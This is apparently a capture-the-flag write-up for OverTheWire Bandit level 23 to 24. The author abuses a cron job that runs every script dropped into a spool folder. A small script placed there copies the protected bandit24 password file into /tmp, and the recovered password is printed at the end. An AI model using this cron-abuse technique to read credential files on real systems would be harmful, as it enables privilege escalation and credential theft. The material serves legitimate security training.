A program is running automatically at regular intervals from cron, the time-based job scheduler.
Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script.
This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

```shell
SSH remote host (hostname or ip address):                                                                                
SSH remote port [22]: 2220                                                                                               
SSH remote username: bandit23                                                                                            
                                                                                                                         
bandit23@bandit.labs.overthewire.org's password: Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)         
                                                                                                                         
 * Documentation:  https://help.ubuntu.com/                                                                              
                                                                                                                         
The programs included with the Ubuntu system are free software;                                                          
the exact distribution terms for each program are described in the                                                       
individual files in /usr/share/doc/*/copyright.                                                                          
                                                                                                                         
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by                                                     
applicable law.                                                                                                          
                                                                                                                         
bandit23@bandit:~$ ls -la                                                                                                
total 24                                                                                                                 
drwxr-xr-x  3 bandit23 bandit23 4096 Oct 24 05:55 .
drwxr-xr-x 30 root     root     4096 Oct 24 05:55 ..
-rw-r--r--  1 bandit23 bandit23  220 Apr  9  2014 .bash_logout                                                           
-rw-r--r--  1 bandit23 bandit23 3637 Apr  9  2014 .bashrc                                                                
drwx------  2 bandit23 bandit23 4096 Oct 24 05:55 .cache
-rw-r--r--  1 bandit23 bandit23  675 Apr  9  2014 .profile  
```

Nothing Usefull

Lets See /etc/cron.d

```shell
bandit23@bandit:~$ ls -la /etc/cron.d/                                                                                   
total 32                                                                                                                 
drwxr-xr-x   2 root root 4096 Sep 28 14:04 .
drwxr-xr-x 119 root root 4096 Oct 24 05:54 ..
-rw-r--r--   1 root root  102 Feb  9  2013 .placeholder                                                                  
-rw-r--r--   1 root root  355 May 25  2013 cron-apt                                                                      
-rw-r--r--   1 root root  120 Sep 28 14:04 cronjob_bandit22                                                              
-rw-r--r--   1 root root  122 Sep 28 14:04 cronjob_bandit23                                                              
-rw-r--r--   1 root root  120 Sep 28 14:04 cronjob_bandit24                                                              
-rw-r--r--   1 root root  510 Aug  4 20:03 php5
```
Reading cronjob_bandit23

```shell
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24                                                                      
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null                                                               
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null                                                             
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh                                                                      
#!/bin/bash                                                                                                              
                                                                                                                         
myname=$(whoami)                                                                                                         
                                                                                                                         
cd /var/spool/$myname                                                                                                    
echo "Executing and deleting all scripts in /var/spool/$myname:"                                                         
for i in * .*;                                                                                                           
do                                                                                                                       
    if [ "$i" != "." -a "$i" != ".." ];                                                                                  
    then                                                                                                                 
        echo "Handling $i"                                                                                               
        timeout -s 9 60 ./$i                                                                                             
        rm -f ./$i                                                                                                       
    fi                                                                                                                   
done                                                                                                                     
                                                                                                                         
```

checking /var/spool/bandit23 , only /var/spool/bandit24 and it says permission denied
okay so it says we will be writing our first bash script 

so lets make folder in /tmp/ i called it menz

and write a script to get bandit24 password stored in /etc/bandit_pass/bandit24

```shell
bandit23@bandit:/tmp/menz$ cat menz.sh                                                                                   
#!/bin/bash                                                                                                              
                                                                                                                         
cat /etc/bandit_pass/bandit24 > /tmp/menz/pass.txt   
```
so it cat the file and save it in our directory with name pass.txt

now we need 2 more things , permission for the script to execute 
```shell
chmod 777 menz.sh
```
and permission for the folder to write in

```shell 
chmod 777 /tmp/menz/
```
now copy the bash script to /var/spool/bandit24/

wait for some time because its a scheduled task

and finally we have our pass.txt
```shell
bandit23@bandit:/tmp/menz$ ls                                                                                            
menz.sh  pass.txt
bandit23@bandit:/tmp/menz$ cat pass.txt                                                                                  
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ       
```
